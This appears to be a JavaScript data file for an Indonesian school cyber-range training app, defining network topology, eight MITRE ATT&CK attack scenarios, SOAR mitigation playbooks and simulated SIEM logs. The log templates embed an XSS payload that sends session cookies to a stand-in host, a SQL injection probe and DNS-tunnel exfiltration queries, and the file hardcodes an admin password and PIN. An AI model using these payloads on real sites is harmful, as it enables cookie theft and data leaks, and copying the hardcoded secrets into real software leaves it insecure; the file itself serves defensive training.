'use strict';
/* Stella Maris SecOps App - data.js
 * Katalog statis: topologi, vektor serangan MITRE ATT&CK, playbook SOAR,
 * template log, trafik wajar, tabel KKM, dan isi Buku Panduan.
 */
window.SMData = (function () {

  const KKM = {
    '7':  { jenjang: 'SMP',     label: 'Kelas 7 (SMP)',      kkm: 75 },
    '8':  { jenjang: 'SMP',     label: 'Kelas 8 (SMP)',      kkm: 78 },
    '9':  { jenjang: 'SMP',     label: 'Kelas 9 (SMP)',      kkm: 80 },
    '10': { jenjang: 'SMA/SMK', label: 'Kelas 10 (SMA/SMK)', kkm: 75 },
    '11': { jenjang: 'SMA/SMK', label: 'Kelas 11 (SMA/SMK)', kkm: 78 },
    '12': { jenjang: 'SMA/SMK', label: 'Kelas 12 (SMA/SMK)', kkm: 80 }
  };

  const KATEGORI = ['Ujian UTS', 'Ujian UAS', 'Latihan / Drill', 'Ulangan Harian'];
  const DURASI = [5, 10, 15, 20, 25, 30];
  const JUMLAH_ANGGOTA = [2, 3, 4];

  const PENGUJI = {
    nama: 'Paulus Renggo, S.Kom.',
    alias: 'PaulNiek',
    institusi: 'SMP / SMA / SMK Katolik Stella Maris Tobelo',
    yayasan: 'Yayasan Pendidikan Katolik • Perwakilan Tobelo',
    alamat: 'Jl. Pendidikan No. 1, Tobelo, Halmahera Utara, Maluku Utara',
    kota: 'Tobelo',
    pengawas: '',
    aplikasi: 'Stella Maris SecOps App @SMITT Tobelo 2026',
    pin: '1234'
  };

  /* ---------- Akses SUPERADMIN ---------- */
  const SUPERADMIN = { password: '1985123*#*' };

  /* ---------- Tujuan Pembelajaran default (materi Cyber Range SIEM & SOAR) ---------- */
  const TUJUAN_PEMBELAJARAN = [
    'Menganalisis log keamanan (syslog / Suricata / IDS) pada SIEM untuk mengidentifikasi indikasi serangan siber berdasarkan kerangka MITRE ATT&CK.',
    'Melakukan triase alert secara tepat (True Positive vs False Positive) serta mengukur MTTD (Mean Time To Detect) suatu insiden.',
    'Merancang dan mengeksekusi playbook SOAR — blacklist IP (iptables), patch WAF (ModSecurity), karantina host (VLAN), rate-limiting SYN flood, pembersihan backdoor, dan restore snapshot — untuk memitigasi insiden.',
    'Menjaga ketersediaan layanan kritis (SLA uptime) infrastruktur sekolah ketika berada di bawah serangan DoS maupun ransomware.',
    'Mendemonstrasikan teknik penetrasi etis secara legal dan bertanggung jawab (reconnaissance, brute force, SQL injection, XSS, DoS, privilege escalation, ransomware, eksfiltrasi data) di dalam lingkungan cyber range yang terisolasi.',
    'Menjunjung tinggi etika profesi keamanan siber serta mematuhi UU No. 11 Tahun 2008 tentang ITE — tidak menyerang sistem nyata tanpa izin tertulis.'
  ];

  /* ---------- Profil identitas sekolah (dapat diubah lewat SUPERADMIN) ---------- */
  const PROFILE_DEFAULT = {
    namaYayasan: PENGUJI.yayasan,
    namaSekolah: PENGUJI.institusi,
    alamat: PENGUJI.alamat,
    kota: PENGUJI.kota,
    namaMapel: 'Dasar Keamanan Informasi / TJKT',
    namaGuru: PENGUJI.nama,
    aliasGuru: PENGUJI.alias,
    pengawasUjian: '',
    tujuan: TUJUAN_PEMBELAJARAN.join('\n'),
    jumlahAnggota: 3,
    blueTeamName: '',
    blueMembers: [],
    redTeamName: '',
    redMembers: [],
    locked: false
  };

  /* ---------- Topologi jaringan sekolah ---------- */
  const NODES = [
    { id: 'INET',  nama: 'Internet Gateway', tipe: 'cloud',    ip: '0.0.0.0',      x: 70,  y: 210, critical: false, desc: 'Upstream ISP 1 Gbps' },
    { id: 'FW-01', nama: 'pfSense Firewall', tipe: 'firewall', ip: '10.10.0.1',    x: 230, y: 210, critical: true,  desc: 'Perimeter stateful + IDS' },
    { id: 'WEB-01',nama: 'DMZ Web Server',   tipe: 'web',      ip: '172.16.9.10',  x: 420, y: 80,  critical: true,  desc: 'Apache 2.4 / portal e-learning' },
    { id: 'DNS-01',nama: 'DNS Bind9',        tipe: 'dns',      ip: '10.10.0.53',   x: 420, y: 340, critical: true,  desc: 'Resolver internal zona smitt.sch.id' },
    { id: 'DB-01', nama: 'Database MariaDB', tipe: 'db',       ip: '10.10.20.11',  x: 610, y: 140, critical: true,  desc: 'Nilai siswa, keuangan, absensi' },
    { id: 'AD-01', nama: 'Active Directory', tipe: 'ad',       ip: '10.10.20.5',   x: 610, y: 280, critical: true,  desc: 'Domain controller SMITT.LOCAL' },
    { id: 'CLI',   nama: 'Segmen Client LAN', tipe: 'client',  ip: '10.10.30.0/24',x: 790, y: 210, critical: false, desc: 'Lab Komputer 1-3, ruang guru' }
  ];

  const LINKS = [
    ['INET', 'FW-01'], ['FW-01', 'WEB-01'], ['FW-01', 'DNS-01'],
    ['FW-01', 'DB-01'], ['FW-01', 'AD-01'], ['WEB-01', 'DB-01'],
    ['AD-01', 'CLI'], ['DNS-01', 'CLI'], ['FW-01', 'CLI']
  ];

  /* ---------- 8 vektor serangan (kerangka MITRE ATT&CK) ---------- */
  const ATTACKS = [
    {
      id: 'recon', tech: 'T1595.001', tactic: 'Reconnaissance', nama: 'Active Scanning (nmap -sS -sV)',
      fase: 1, butuh: [], durasi: 4, sukses: 0.95, target: 'FW-01', damage: { 'FW-01': 0 },
      flag: null, exfil: 0,
      ringkas: 'Memetakan port & banner layanan perimeter tanpa merusak. Membuka seluruh vektor lanjutan.',
      mit: ['blacklist']
    },
    {
      id: 'brute', tech: 'T1110.001', tactic: 'Credential Access', nama: 'SSH/RDP Password Spraying',
      fase: 2, butuh: ['recon'], durasi: 6, sukses: 0.55, target: 'AD-01', damage: { 'AD-01': 12 },
      flag: null, exfil: 0, grants: 'foothold',
      ringkas: 'Menebak kredensial domain lewat ribuan percobaan login. Jika tembus -> initial access.',
      mit: ['blacklist']
    },
    {
      id: 'sqli', tech: 'T1190', tactic: 'Initial Access', nama: 'SQL Injection (UNION SELECT)',
      fase: 2, butuh: ['recon'], durasi: 6, sukses: 0.60, target: 'WEB-01', damage: { 'WEB-01': 8, 'DB-01': 18 },
      flag: 'flag{sqli_union_dbeaver_smitt}', exfil: 60, grants: 'foothold',
      ringkas: 'Menyuntik query ke form login portal e-learning untuk membongkar tabel credentials.',
      mit: ['waf']
    },
    {
      id: 'xss', tech: 'T1189', tactic: 'Initial Access', nama: 'Stored XSS Payload',
      fase: 2, butuh: ['recon'], durasi: 5, sukses: 0.65, target: 'WEB-01', damage: { 'WEB-01': 8 },
      flag: 'flag{xss_stored_forum_cookie}', exfil: 15, grants: 'foothold',
      ringkas: 'Menanam script di forum siswa; cookie sesi guru dikirim ke listener penyerang.',
      mit: ['waf']
    },
    {
      id: 'synflood', tech: 'T1498.001', tactic: 'Impact', nama: 'SYN Flood DoS (hping3)',
      fase: 2, butuh: [], durasi: 8, sukses: 0.80, target: 'WEB-01', damage: { 'WEB-01': 45, 'FW-01': 18, 'DNS-01': 15 },
      flag: null, exfil: 0,
      ringkas: 'Banjiri half-open connection sampai layanan kehabisan backlog. Menjatuhkan SLA uptime.',
      mit: ['synrate', 'blacklist']
    },
    {
      id: 'privesc', tech: 'T1068', tactic: 'Privilege Escalation', nama: 'Kernel Exploit (CVE DirtyPipe)',
      fase: 3, butuh: ['foothold'], durasi: 6, sukses: 0.50, target: 'WEB-01', damage: { 'WEB-01': 15 },
      flag: 'flag{privesc_root_www_data}', exfil: 0, grants: 'root',
      ringkas: 'Naik dari www-data ke root lewat kerentanan kernel. Membuka jalan ransomware.',
      mit: ['quarantine', 'backdoor']
    },
    {
      id: 'ransom', tech: 'T1486', tactic: 'Impact', nama: 'Ransomware Deployment (AES-256)',
      fase: 4, butuh: ['root'], durasi: 9, sukses: 0.70, target: 'DB-01', damage: { 'DB-01': 95, 'AD-01': 50 },
      flag: 'flag{ransom_note_readme_smitt}', exfil: 0, ransom: true,
      ringkas: 'Mengenkripsi berkas database & share guru, meninggalkan README tebusan. Layanan lumpuh.',
      mit: ['quarantine', 'restore', 'backdoor']
    },
    {
      id: 'exfil', tech: 'T1048.003', tactic: 'Exfiltration', nama: 'Data Exfiltration (DNS Tunnel)',
      fase: 5, butuh: ['foothold'], durasi: 10, sukses: 0.60, target: 'DNS-01', damage: { 'DNS-01': 12 },
      flag: 'flag{exfil_dns_txt_1gb}', exfil: 450,
      ringkas: 'Membocorkan dump nilai & data pribadi lewat TXT record DNS ke server eksternal.',
      mit: ['blacklist', 'quarantine']
    }
  ];

  const ATTACK_MAP = Object.fromEntries(ATTACKS.map(a => [a.id, a]));
  const TOTAL_TECH = ATTACKS.length;
  const TOTAL_FLAGS = ATTACKS.filter(a => a.flag).length;
  const TARGET_EXFIL = 500; // MB acuan untuk komponen skor Red

  /* ---------- 6 playbook SOAR ---------- */
  const PLAYBOOKS = [
    {
      id: 'blacklist', kode: 'SOAR-PB-01', nama: 'iptables IP Blacklist',
      counter: ['recon', 'brute', 'synflood', 'exfil'], ttl: 120, disrupt: 2,
      cmd: 'iptables -I INPUT -s {IP} -j DROP && iptables -I FORWARD -s {IP} -j DROP',
      desc: 'Blokir IP sumber penyerang di perimeter pfSense. Efektif untuk vektor berbasis IP; melemah bila Red memakai proxy rotation.',
      target: 'ip'
    },
    {
      id: 'waf', kode: 'SOAR-PB-02', nama: 'ModSecurity WAF Patch',
      counter: ['sqli', 'xss'], ttl: 150, disrupt: 1,
      cmd: 'SecRule REQUEST_URI|ARGS "(?i)(union.*select|<script)" "id:99{N},deny,status:403"',
      desc: 'Terapkan ruleset OWASP CRS pada Apache/ModSecurity untuk menolak payload injeksi & cross-site scripting.',
      target: 'node'
    },
    {
      id: 'quarantine', kode: 'SOAR-PB-03', nama: 'Host Quarantine VLAN',
      counter: ['privesc', 'ransom', 'exfil'], ttl: 140, disrupt: 6,
      cmd: 'vlanctl --move {NODE} --vlan 666 --isolate && switchport block {NODE}',
      desc: 'Isolasi host terdampak ke VLAN karantina. Menghentikan pergerakan lateral & enkripsi lanjutan, namun memutus layanan sah (disruptif).',
      target: 'node'
    },
    {
      id: 'synrate', kode: 'SOAR-PB-04', nama: 'SYN Flood Rate-Limiting',
      counter: ['synflood'], ttl: 130, disrupt: 3,
      cmd: 'iptables -A SYN_FLOOD -p tcp --syn -m limit --limit 25/s --limit-burst 50 -j ACCEPT',
      desc: 'Aktifkan syncookie + rate limit koneksi baru di firewall agar backlog layanan tidak jenuh.',
      target: 'node'
    },
    {
      id: 'backdoor', kode: 'SOAR-PB-05', nama: 'Backdoor Killer',
      counter: ['privesc', 'ransom', 'xss'], ttl: 160, disrupt: 2, revoke: ['foothold', 'root'],
      cmd: 'chkrootkit -q && rkhunter --check --sk && kill -9 $(pgrep -f "nc -e|/tmp/.x")',
      desc: 'Sapu webshell, rootkit, reverse shell, dan cron persistence. Mencabut akses (foothold/root) yang sudah dipegang Red.',
      target: 'node'
    },
    {
      id: 'restore', kode: 'SOAR-PB-06', nama: 'Snapshot Restore',
      counter: ['ransom'], ttl: 90, disrupt: 8, restore: true,
      cmd: 'zfs rollback db01/dataset@snapshot-harian && systemctl restart mariadb',
      desc: 'Rollback host ke snapshot terakhir yang bersih. Memulihkan health & mengakhiri status ransomware.',
      target: 'node'
    }
  ];
  const PLAYBOOK_MAP = Object.fromEntries(PLAYBOOKS.map(p => [p.id, p]));

  /* ---------- IP sumber Red (proxy pool) ---------- */
  const RED_IPS = ['203.0.113.66', '198.51.100.24', '185.220.101.7', '45.155.205.99', '91.219.236.18'];
  const PROXY_POOL = ['nl-amsterdam.exit', 'ru-moscow.exit', 'ch-zurich.exit', 'sg-relay.exit', 'br-saopaulo.exit'];

  /* ---------- Template log ---------- */
  const SEV = {
    INFO:     { rank: 1, warna: '#4fd1c5' },
    WARNING:  { rank: 2, warna: '#f6c445' },
    ALERT:    { rank: 3, warna: '#ff8c42' },
    CRITICAL: { rank: 4, warna: '#ff4d6d' }
  };

  function logFor(attack, ctx) {
    const ip = ctx.ip, tgt = ctx.targetNode, t = ctx.ts;
    switch (attack.id) {
      case 'recon': return [
        { sev: 'INFO',    proto: 'TCP', src: ip, dst: tgt.ip, app: 'suricata', msg: `ET SCAN Nmap Scripting Engine User-Agent Detected (Mozilla/5.0 NSE)` , alert: true },
        { sev: 'WARNING', proto: 'TCP', src: ip, dst: tgt.ip, app: 'kernel',   msg: `SYN_RECV pada 412 port berurutan dari ${ip} dalam 3 detik - indikasi port sweep` , alert: true },
        { sev: 'ALERT',   proto: 'TCP', src: ip, dst: tgt.ip, app: 'suricata', msg: `ET SCAN Potential SSH Scan / ${attack.tech} - Signature match, priority 2`, alert: true }
      ];
      case 'brute': return [
        { sev: 'WARNING', proto: 'TCP', src: ip, dst: tgt.ip, app: 'sshd',   msg: `Failed password for admin from ${ip} port ${40000 + (t % 9000)} ssh2` , alert: true },
        { sev: 'ALERT',   proto: 'TCP', src: ip, dst: tgt.ip, app: 'sshd',   msg: `message repeated 348 times: Failed password for invalid user guru from ${ip}`, alert: true },
        { sev: 'CRITICAL',proto: 'TCP', src: ip, dst: tgt.ip, app: 'suricata', msg: `ET POLICY ${attack.tech} - Credential brute force threshold exceeded (500 attempt/60s)`, alert: true }
      ];
      case 'sqli': return [
        { sev: 'WARNING', proto: 'HTTP', src: ip, dst: tgt.ip, app: 'apache2', msg: `GET /login.php?user=admin'--&pass=x HTTP/1.1 200 4821`, alert: true },
        { sev: 'ALERT',   proto: 'HTTP', src: ip, dst: tgt.ip, app: 'modsec',  msg: `Rule 942100 [id "SQL Injection Attack Detected via libinjection"] - UNION SELECT`, alert: true },
        { sev: 'CRITICAL',proto: 'SQL', src: tgt.ip, dst: '10.10.20.11', app: 'mariadb', msg: `Access denied turned into full table dump: information_schema.tables -> smitt.credentials (2.418 rows)`, alert: true }
      ];
      case 'xss': return [
        { sev: 'WARNING', proto: 'HTTP', src: ip, dst: tgt.ip, app: 'apache2', msg: `POST /forum/post.php body mengandung "<svg onload=fetch('//evil.tld/c?'+document.cookie)">"`, alert: true },
        { sev: 'ALERT',   proto: 'HTTP', src: ip, dst: tgt.ip, app: 'modsec',  msg: `Rule 941110 XSS Filter - Category 1: Script Tag Vector`, alert: true },
        { sev: 'CRITICAL',proto: 'HTTP', src: tgt.ip, dst: ip, app: 'suricata', msg: `ET WEB_SERVER Session cookie exfiltration ke host eksternal (${attack.tech})`, alert: true }
      ];
      case 'synflood': return [
        { sev: 'ALERT',   proto: 'TCP', src: ip, dst: tgt.ip, app: 'suricata', msg: `ET DOS Possible TCP SYN Flood - ${attack.tech} (${(12000 + t % 9000)} pps)`, alert: true },
        { sev: 'CRITICAL',proto: 'TCP', src: ip, dst: tgt.ip, app: 'kernel',   msg: `TCP: request_sock_TCP: Possible SYN flooding on port 443. Sending cookies.`, alert: true },
        { sev: 'CRITICAL',proto: 'TCP', src: tgt.ip, dst: '0.0.0.0', app: 'apache2', msg: `worker threads exhausted (256/256) - service unavailable 503`, alert: true }
      ];
      case 'privesc': return [
        { sev: 'ALERT',   proto: 'LOCAL', src: tgt.ip, dst: tgt.ip, app: 'auditd', msg: `uid=33(www-data) execve("/tmp/.pipeexploit") argc=1`, alert: true },
        { sev: 'CRITICAL',proto: 'LOCAL', src: tgt.ip, dst: tgt.ip, app: 'auditd', msg: `uid berubah 33 -> 0 (root) via ${attack.tech}; SUID abuse terdeteksi`, alert: true },
        { sev: 'CRITICAL',proto: 'LOCAL', src: tgt.ip, dst: tgt.ip, app: 'kernel', msg: `pipe_buffer flag manipulation - kernel memory write, integrity compromised`, alert: true }
      ];
      case 'ransom': return [
        { sev: 'ALERT',   proto: 'SMB', src: ip, dst: tgt.ip, app: 'smbd',   msg: `Mass rename pada share \\GURU$ : 4.182 berkas -> *.smittenc`, alert: true },
        { sev: 'CRITICAL',proto: 'LOCAL', src: tgt.ip, dst: tgt.ip, app: 'clamav', msg: `Win.Ransomware.Lockbit-98741201 terdeteksi di /var/lib/mysql/`, alert: true },
        { sev: 'CRITICAL',proto: 'LOCAL', src: tgt.ip, dst: tgt.ip, app: 'systemd', msg: `README_RESTORE.txt ditulis ke root filesystem - layanan mariadb.service FAILED`, alert: true }
      ];
      case 'exfil': return [
        { sev: 'WARNING', proto: 'UDP', src: tgt.ip, dst: '203.0.113.9', app: 'named', msg: `query: aGVhZGVyLWR1bXAtMDA0Mg.evil-tunnel.tld TXT IN`, alert: true },
        { sev: 'ALERT',   proto: 'UDP', src: tgt.ip, dst: '203.0.113.9', app: 'suricata', msg: `ET DNS Query for .tld Suspicious TXT Record - possible tunneling (${attack.tech})`, alert: true },
        { sev: 'CRITICAL',proto: 'UDP', src: tgt.ip, dst: '203.0.113.9', app: 'named', msg: `Volume DNS TXT keluar ${(ctx.exfil || 0)} MB dalam 60 detik - PII & nilai siswa bocor`, alert: true }
      ];
      default: return [];
    }
  }

  /* ---------- Trafik wajar (benign) ---------- */
  const BENIGN = [
    { sev: 'INFO', proto: 'UDP', app: 'named', msg: 'query: elearning.smitt.sch.id A IN +E(0)K (10.10.30.{n})', fp: 0.06 },
    { sev: 'INFO', proto: 'HTTP', app: 'apache2', msg: 'GET /dashboard HTTP/1.1 200 {ms}ms - siswa{nn}@smitt (10.10.30.{n})', fp: 0 },
    { sev: 'INFO', proto: 'TCP', app: 'sshd', msg: 'Accepted publickey for guru from 10.10.30.{n} port {p} ssh2', fp: 0 },
    { sev: 'INFO', proto: 'SQL', app: 'mariadb', msg: 'Slow query (2.{n}s): SELECT * FROM absensi WHERE tanggal=CURDATE()', fp: 0.05 },
    { sev: 'INFO', proto: 'SYS', app: 'systemd', msg: 'Started Daily apt download activities on CLI-LAN-{nn}.', fp: 0 },
    { sev: 'INFO', proto: 'TCP', app: 'suricata', msg: 'TLS handshake sukses ke update.microsoft.com (10.10.30.{n})', fp: 0 },
    { sev: 'WARNING', proto: 'TCP', app: 'sshd', msg: 'Failed password for guru from 10.10.30.{n} port {p} ssh2 (salah ketik)', fp: 1 },
    { sev: 'WARNING', proto: 'HTTP', app: 'apache2', msg: 'POST /upload/tugas berkas 48 MB dari 10.10.30.{n} - mendekati limit', fp: 1 },
    { sev: 'WARNING', proto: 'SYS', app: 'clamd', msg: 'Database signature update dimulai, CPU load 78% pada DB-01', fp: 1 },
    { sev: 'WARNING', proto: 'UDP', app: 'named', msg: 'SERVFAIL untuk printer.lab.smitt.sch.id dari 10.10.30.{n}', fp: 1 },
    { sev: 'INFO', proto: 'SYS', app: 'cron', msg: 'Backup harian rsync ke NAS 10.10.40.9 selesai (12,4 GB)', fp: 0 },
    { sev: 'INFO', proto: 'HTTP', app: 'apache2', msg: 'GET /pengumuman HTTP/1.1 304 Not Modified - ruang guru', fp: 0 }
  ];

  const NOISE = [
    { sev: 'INFO', proto: 'SYS', app: 'kernel', msg: 'pfSense: state table 1.284/400.000 entries, mbuf usage 12%' },
    { sev: 'INFO', proto: 'TCP', app: 'suricata', msg: 'Rule reload selesai: 42.118 signatures aktif, engine READY' },
    { sev: 'INFO', proto: 'SYS', app: 'ntpd', msg: 'Sinkronisasi waktu ke ntp.kemdikbud.go.id offset +0.0021s' },
    { sev: 'INFO', proto: 'SYS', app: 'smartd', msg: 'SMART Health OK pada /dev/sda DB-01 ( suhu 38C )' }
  ];

  /* ---------- Rubrik 4 aspek kompetensi ---------- */
  const RUBRIK = [
    { kode: 'A1', nama: 'Deteksi & Analisis Log SIEM', bobot: 25, tim: 'blue' },
    { kode: 'A2', nama: 'Mitigasi Firewall & SOAR',    bobot: 30, tim: 'blue' },
    { kode: 'A3', nama: 'Ketersediaan Layanan SLA',    bobot: 25, tim: 'blue' },
    { kode: 'A4', nama: 'Penetrasi & Vektor Serangan', bobot: 20, tim: 'red'  }
  ];

  const PERAN_BLUE = ['SOC Analyst (Triage)', 'Security Administrator (Firewall)', 'Incident Responder (SOAR)', 'Forensic & Reporting'];
  const PERAN_RED  = ['Recon Operator', 'Exploit Developer', 'Post-Exploitation / C2', 'Exfiltration Specialist'];

  return {
    KKM, KATEGORI, DURASI, JUMLAH_ANGGOTA, PENGUJI,
    SUPERADMIN, TUJUAN_PEMBELAJARAN, PROFILE_DEFAULT,
    NODES, LINKS, ATTACKS, ATTACK_MAP, TOTAL_TECH, TOTAL_FLAGS, TARGET_EXFIL,
    PLAYBOOKS, PLAYBOOK_MAP, RED_IPS, PROXY_POOL,
    SEV, logFor, BENIGN, NOISE, RUBRIK, PERAN_BLUE, PERAN_RED
  };
})();
